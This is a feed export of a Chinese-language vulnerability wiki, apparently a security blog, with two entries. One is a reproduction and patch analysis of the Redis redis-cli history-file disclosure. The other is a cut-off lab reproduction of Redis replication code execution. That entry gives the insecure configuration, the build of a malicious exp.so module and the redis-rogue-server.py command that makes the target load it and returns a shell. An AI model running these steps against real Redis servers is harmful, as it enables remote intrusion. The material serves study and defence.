    <summary type="html">&lt;h2 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h2&gt;&lt;h3 id=&quot;漏洞简介&quot;&gt;&lt;a href=&quot;#漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;漏洞简介&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="1. 漏洞相关" scheme="http://example.com/categories/1-%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"/>
    
    <category term="Redis" scheme="http://example.com/categories/1-%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/"/>
    
    
    <category term="Redis" scheme="http://example.com/tags/Redis/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2013-7458_Redis redis-cli信息泄露漏洞</title>
    <link href="http://example.com/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2013-7458-Redis-redis-cli%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2013-7458-Redis-redis-cli%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-07-06T08:13:34.000Z</published>
    <updated>2021-07-06T08:18:58.763Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><ul><li>漏洞名称：Redis redis-cli信息泄露漏洞</li><li>漏洞编号：CVE-2013-7458</li><li>漏洞类型：信息泄露</li><li>CVSS评分：【CVSS v2.0：】【CVSS v3.0：3.3】</li><li>漏洞危害等级：低危</li></ul><h3 id="组件概述"><a href="#组件概述" class="headerlink" title="组件概述"></a>组件概述</h3><p>​        Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。</p><p>​        它通常被称为数据结构服务器，因为值（value）可以是 字符串(String), 哈希(Hash), 列表(list), 集合(sets) 和 有序集合(sorted sets)等类型。</p><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>​        Redis redis-cli中存在本地信息泄露漏洞，该漏洞源于程序设置.rediscli_history文件为全局可读。攻击者可利用该漏洞获取敏感信息。</p><h3 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h3><p>​        攻击者先需要获取redis-server所在服务器的低权限用户。</p><h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>​        Redis: 3.2.2</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>​        本地使用redis-cli连接redis-server</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli</span><br></pre></td></tr></table></figure><p>​        随便输入一些命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; config get client-output-buffer-limit</span><br><span class="line">1) &quot;client-output-buffer-limit&quot;</span><br><span class="line">2) &quot;normal 0 0 0 slave 268435456 67108864 60 pubsub 33554432 8388608 60&quot;</span><br><span class="line">127.0.0.1:6379&gt;info</span><br></pre></td></tr></table></figure><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2013-7458-Redis-redis-cli%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/3.png"></p><p>​        退出redis-cli，用本地用户切换到/home路径下，查看.rediscli_history文件，此文件记录了redis-cli的一系列操作。</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2013-7458-Redis-redis-cli%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/1.png"></p><p>​        文件末尾包括刚刚执行的命令。</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2013-7458-Redis-redis-cli%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/2.png"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="技术背景"><a href="#技术背景" class="headerlink" title="技术背景"></a>技术背景</h3><h4 id="包含头文件"><a href="#包含头文件" class="headerlink" title="包含头文件:"></a>包含头文件:</h4><blockquote><p>/#include &lt;sys/stat.h&gt; 　<br>/#include &lt;sys/types.h&gt;</p></blockquote><h4 id="函数"><a href="#函数" class="headerlink" title="函数:"></a>函数:</h4><blockquote><p>函数原型： 　　int mkdir(const char *pathname, mode_t mode); 　　<br>函数说明： 　　mkdir()函数以mode方式创建一个以参数pathname命名的目录，mode定义新创建目录的权限。 　　<br>返回值： 　　若目录创建成功，则返回0；否则返回-1，并将错误记录到全局变量errno中。</p></blockquote><h4 id="模式类型"><a href="#模式类型" class="headerlink" title="模式类型:"></a>模式类型:</h4><blockquote><p>mode方式： 　　<br>S_IRWXU 00700权限，代表该文件所有者拥有读，写和执行操作的权限<br>S_IRUSR(S_IREAD) 00400权限，代表该文件所有者拥有可读的权限<br>S_IWUSR(S_IWRITE) 00200权限，代表该文件所有者拥有可写的权限<br>S_IXUSR(S_IEXEC) 00100权限，代表该文件所有者拥有执行的权限<br>S_IRWXG 00070权限，代表该文件用户组拥有读，写和执行操作的权限<br>S_IRGRP 00040权限，代表该文件用户组拥有可读的权限<br>S_IWGRP 00020权限，代表该文件用户组拥有可写的权限<br>S_IXGRP 00010权限，代表该文件用户组拥有执行的权限<br>S_IRWXO 00007权限，代表其他用户拥有读，写和执行操作的权限<br>S_IROTH 00004权限，代表其他用户拥有可读的权限<br>S_IWOTH 00002权限，代表其他用户拥有可写的权限<br>S_IXOTH 00001权限，代表其他用户拥有执行的权限</p></blockquote><h4 id="Demo"><a href="#Demo" class="headerlink" title="Demo:"></a>Demo:</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> isCreate = <span class="built_in">mkdir</span>(path,S_IRUSR | S_IWUSR | S_IXUSR | S_IRWXG | S_IRWXO);</span><br><span class="line"><span class="keyword">if</span>( !isCreate )</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;create path:%s\n&quot;</span>,path);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;create path failed! error code : %s \n&quot;</span>,isCreate,path);</span><br></pre></td></tr></table></figure><h3 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h3><h4 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h4><p>​        如果.rediscli_history文件不存在，则使用默认的umask 0022创建该文件，因此该文件的权限为0644。</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2013-7458-Redis-redis-cli%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/4.png"></p><p>​        redis-cli会将其历史记录默认写入~路径下，通常载/home中的文件夹，默认情况下，该文件夹可以在被其他用户读取，因为权限为0644，如上图所示。</p><p>​        在/deps/linenoise/linenoise.c文件中linenoiseHistorySave的函数，作用为创建一个文件，写入历史记录并保存。</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2013-7458-Redis-redis-cli%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/5.png"></p><p>​        /src/redis-cli.c文件的repl函数，调用了linenoiseHistorySave，来保存历史命令，创建.rediscli_history文件，没有考虑权限分配，默认umask为0022，故创建出一个权限为0644的.rediscli_history文件</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2013-7458-Redis-redis-cli%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/6.png"></p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2013-7458-Redis-redis-cli%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/7.png"></p><h4 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h4><p>​    在/deps/linenoise/linenoise.c文件中linenoiseHistorySave函数中增加，umask设置</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2013-7458-Redis-redis-cli%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/8.png"></p><p>​        打开文件前先进行权限掩码设置：</p><p>​         S_IWUSR 00200权限，代表该文件所有者拥有可写的权限， S_IRWXG 00070权限，代表该文件用户组拥有读，写和执行操作的权限，S_IRWXO 00007权限，代表其他用户拥有读，写和执行操作的权限。</p><p>​        写入数据后，更改文件权限（chmod）为 S_IRUSR 00400权限，代表该文件所有者拥有可读的权限， S_IWUSR(S_IWRITE) 00200权限，代表该文件所有者拥有可写的权限，其他组和其他用户无任何权限。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><ul><li><a href="http://www.openwall.com/lists/oss-security/2016/07/28/10">http://www.openwall.com/lists/oss-security/2016/07/28/10</a></li><li><a href="https://github.com/antirez/redis/pull/1418">https://github.com/antirez/redis/pull/1418</a></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h2&gt;&lt;h3 id=&quot;漏洞简介&quot;&gt;&lt;a href=&quot;#漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;漏洞简介&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="1. 漏洞相关" scheme="http://example.com/categories/1-%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"/>
    
    <category term="Redis" scheme="http://example.com/categories/1-%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/"/>
    
    
    <category term="Redis" scheme="http://example.com/tags/Redis/"/>
    
  </entry>
  
  <entry>
    <title>Redis主从复制代码执行漏洞</title>
    <link href="http://example.com/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-07-06T08:02:31.000Z</published>
    <updated>2021-07-06T08:08:53.686Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><ul><li>漏洞名称：Redis Replication代码执行漏洞</li><li>漏洞编号：CNVD-2020-21479</li><li>漏洞类型：代码执行</li><li>CVSS评分：【CVSS v2.0：】【CVSS v3.0：】</li><li>漏洞危害等级：高危</li></ul><h3 id="组件概述"><a href="#组件概述" class="headerlink" title="组件概述"></a>组件概述</h3><p>​        Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。</p><p>​        它通常被称为数据结构服务器，因为值（value）可以是 字符串(String), 哈希(Hash), 列表(list), 集合(sets) 和 有序集合(sorted sets)等类型。</p><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>​        Redis Replication存在代码执行漏洞，该漏洞源于网络系统或产品的代码开发过程中存在设计或实现不当的问题。攻击者可利用漏洞执行任意代码。</p><p>由于Redis 4.x以及之后的版本，Redis新增了模块功能，用户可以通过外部拓展实现用户需要的功能，这样就可以在Redis中实现一个新的Redis命令。攻击者可以利用此功能（由Redis的主机实例通过fullresync同步到从机），使被攻击机加载恶意的模块.so文件，从而实现远程命令执行。</p><h3 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h3><p>1、Redis配置了空密码或者弱密码</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1.png"></p><p>2、Redis配置文件中bind绑定0.0.0.0 127.0.0.1或者被注释</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/2.png"></p><p>3、Redis解除保护模式，可以在配置文件将protected-mode，设置为no</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protected-mode no</span><br></pre></td></tr></table></figure><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/9.png"></p><p>或者，启动redis-server后，在redis-cli中输入命令，临时关闭保护模式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONFIG SET protected-mode no</span><br></pre></td></tr></table></figure><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/3.png"></p><p>3、Redis配置 /var/lib/redis/dump.rdb是slave服务器默认的保存路径，没有保存这个文件的文件夹，创建相应文件夹，给redis用户权限，或者直接运行在root权限下</p><p>攻击者可以远程连接到以上配置的redis，并执行命令。</p><h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>redis 4.x</p><p>redis 5.x</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a href="https://download.redis.io/releases/">https://download.redis.io/releases/</a></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="环境拓扑"><a href="#环境拓扑" class="headerlink" title="环境拓扑"></a>环境拓扑</h3><p>10.251.0.33 （kali，master）——————————————————————————-&gt; 10.251.0.36（Redis-server，slave）</p><p>主从关系，攻击机为master，靶机为slave。</p><h3 id="应用协议"><a href="#应用协议" class="headerlink" title="应用协议"></a>应用协议</h3><p>6379/RESP（Redis的序列化协议）</p><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>启动靶机10.251.0.36的redis-server（slave）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-server</span><br></pre></td></tr></table></figure><p>在攻击机Kali 10.251.0.33，本地编译一个恶意的exp.so</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd RedisModulesSDK/exp/</span><br><span class="line">make</span><br></pre></td></tr></table></figure><p><a href="https://github.com/RicterZ/RedisModules-ExecuteCommand">https://github.com/RicterZ/RedisModules-ExecuteCommand</a></p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/4.png"></p><p>启动攻击机的redis-server（master），并执行模拟的redis-cli程序，发送恶意命令，既执行redis-rogue-server.py</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 redis-rogue-server.py --rhost 10.251.0.36 --lhost 10.251.0.33</span><br></pre></td></tr></table></figure><p>执行前，先检查攻击机的redis-server（master）和靶机redis-server（slave）的保护模式是否都关闭了，若未关闭，被执行命令的redis服务器会报错</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/6.png"></p><p>在攻击机运行redis-cli，关闭保护模式</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/5.png"></p><p>在靶机上运行redis-cli，关闭保护模式</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/3.png"></p><p>启动攻击机的redis-server（master），并执行redis-rogue-server.py</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 redis-rogue-server.py --rhost 10.251.0.36 --lhost 10.251.0.33</span><br></pre></td></tr></table></figure><p>执行后靶机报错，权限不足</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/8.png"></p><p>Redis主从文件权限问题</p><p>问题：Opening the temp file needed for MASTER &lt;-&gt; SLAVE synchronization: Permission denied</p><p>通过日志看出来是同步文件权限的问题</p><p>问题是dump.rdb文件已经成功从master复制的到了slave服务器  /var/lib/redis/dump.rdb是slave服务器默认的保存路径，没有保存这个文件的文件夹，创建相应文件夹，给redis用户权限，靶机redis-server运行在普通用户权限，无法加载.so运行，为了复现顺利，故以root权限运行redis-server</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo redis-server</span><br></pre></td></tr></table></figure><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/11.png"></p><p>再次执行redis-rogue-server.py</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 redis-rogue-server.py --rhost 10.251.0.36 --lhost 10.251.0.33</span><br></pre></td></tr></table></figure><p>靶机redis-server信息台打印出加载.so成功的信息</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/12.png"></p><p>看一下攻击机kali 的redis-server（master）的控制台信息，发现主从配置成功</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/10.png"></p><p>攻击机kali，redis-rogue-server信息台输出，shell接口，输入id返回ID信息（信息编码问题）</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/13.png"></p><p>从数据包中可以看到id被执行成功后，返回的信息</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/14.png"></p><p>可以看一下执行命令后的主从关系，攻击机为master</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/15.png"></p><p>靶机为slave</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/16.png"></p><p>ps：</p><p>修改了默认的配置文件后，直接启动redis，新的配置文件是不生效的，所以必须指定配置文件路径的方式来启动：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./redis-server /usr/local/redis-4.0.0/redis.conf</span><br></pre></td></tr></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="技术背景"><a href="#技术背景" class="headerlink" title="技术背景"></a>技术背景</h3><h4 id="Redis命令与RESP协议"><a href="#Redis命令与RESP协议" class="headerlink" title="Redis命令与RESP协议"></a>Redis命令与RESP协议</h4><p>​        Redis是轻量级的，非易失性键值数据存储。 它通过Redis序列化协议（RESP）提供对简单易变数据结构的访问，该协议是基于TCP的协议。 与大多数其他数据库一样，Redis遵循客户端—服务器模型。 客户端能够通过Redis命令在Redis服务器上创建，修改和检索记录。 </p><p>​        例如，以下命令创建“ TEST”字符串记录并将其分配给“ 1234”键值，将此记录修改为“ TEST2”并分别检索记录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SET 1234 TEST</span><br><span class="line">GETSET 1234 TEST2</span><br><span class="line">GET 1234</span><br></pre></td></tr></table></figure><p>​        有关Redis命令的完整列表，请参考 <a href="http://redis.io/commands">http://redis.io/commands</a></p><p>​        Redis客户端通过端口6379通过TCP使用Redis序列化协议（RESP）与服务器进行通信。可通过 <a href="http://redis.io/topics/protocol%E8%8E%B7%E5%BE%97%E8%AF%A5%E5%8D%8F%E8%AE%AE%E8%AF%A6%E7%BB%86%E8%AF%B4%E6%98%8E%E3%80%82">http://redis.io/topics/protocol获得该协议详细说明。</a> RESP使用五种数据类型，这些数据类型由相应数据的第一个字节标识：</p><ul><li><p>简单字符串以“ +”字符开头</p></li><li><p>错误以“-”字符开头</p></li><li><p>整数以“：”字符开头</p></li><li><p>批量字符串以“ $”字符开头</p></li><li><p>数组以“ *”字符开头</p><p>​    批量字符串以“ $”字符开头，后跟相应字符串的长度。 以下重点介绍如何将“ Sangfor”表示为大容量字符串：</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$7 CRLF</span><br><span class="line">TELUS</span><br></pre></td></tr></table></figure><p>​        其中CRLF表示新的行序列回车（CR），后跟换行（LF）。 </p><p>​        RESP数组以“ *”字符开头，后跟数组中的元素数。 下面说明了一个由2个元素组成的大容量字符串数组：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*2 CRLF</span><br><span class="line">$7 CRLF</span><br><span class="line">Sangfor CRLF</span><br><span class="line">$4 CRLF</span><br><span class="line">TEST CRLF</span><br></pre></td></tr></table></figure><p>​        所有Redis命令都通过RESP字符串数组发送到服务器。 例如，上述SET命令将以下形式发送：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*3 CRLF</span><br><span class="line">$3 CRLF</span><br><span class="line">SET CRLF</span><br><span class="line">$4 CRLF</span><br><span class="line">1234 CRLF</span><br><span class="line">$4 CRLF</span><br><span class="line">TEST CRLF</span><br></pre></td></tr></table></figure><h4 id="Redis主从复制"><a href="#Redis主从复制" class="headerlink" title="Redis主从复制"></a>Redis主从复制</h4><p>​        主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点（master），后者称为从节点（slave）；数据的复制是单向的，只能由主节点到从节点。</p><p>​        默认情况下，每台Redis服务器都是主节点；且一个主节点可以有多个从节点（或没有从节点），但一个从节点只能有一个主节点。</p><p>​        主从复制的作用主要包括：</p><ul><li>数据冗余：主从复制实现了数据的热备份，是持久化之外的一种数据冗余方式。</li><li>故障恢复：当主节点出现问题时，可以由从节点提供服务，实现快速的故障恢复；实际上是一种服务的冗余。</li><li>负载均衡：在主从复制的基础上，配合读写分离，可以由主节点提供写服务，由从节点提供读服务（即写Redis数据时应用连接主节点，读Redis数据时应用连接从节点），分担服务器负载；尤其是在写少读多的场景下，通过多个从节点分担读负载，可以大大提高Redis服务器的并发量。</li><li>高可用基石：除了上述作用以外，主从复制还是哨兵和集群能够实施的基础，因此说主从复制是Redis高可用的基础。</li></ul><h5 id="如何使用主从复制"><a href="#如何使用主从复制" class="headerlink" title="如何使用主从复制"></a>如何使用主从复制</h5><ol><li>建立复制</li></ol><p>需要注意，<strong>主从复制的开启，完全是在从节点发起的；不需要我们在主节点做任何事情。</strong></p><p>从节点开启主从复制，有3种方式：</p><p>（1）配置文件</p><p>在从服务器的配置文件中加入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">slaveof &lt;masterip&gt; &lt;masterport&gt;</span><br></pre></td></tr></table></figure><p>（2）启动命令</p><p>redis-server启动命令后加入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-server --slaveof &lt;masterip&gt; &lt;masterport&gt;</span><br></pre></td></tr></table></figure><p>（3）客户端命令</p><p>Redis服务器启动后，直接通过redis-cli客户端执行命令，则该Redis实例成为从节点。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">slaveof &lt;masterip&gt; &lt;masterport&gt;</span><br></pre></td></tr></table></figure><p>以上3种方式是等效的，下面以客户端命令的方式为例，看一下当执行了slaveof后，Redis主节点和从节点的变化。</p><ol start="2"><li>实例</li></ol><p>通过以上3种方式的任意一种，建立主从关系，实例中10.251.0.33为主节点（master），10.251.0.36为从节点（slave）</p><p>下面验证一下，在主从复制建立后，主节点的数据会复制到从节点中。</p><p>（1）首先在从节点，查询一个不存在的key：</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/17.png"></p><p>（2）然后在主节点中增加这个key：</p><p><img 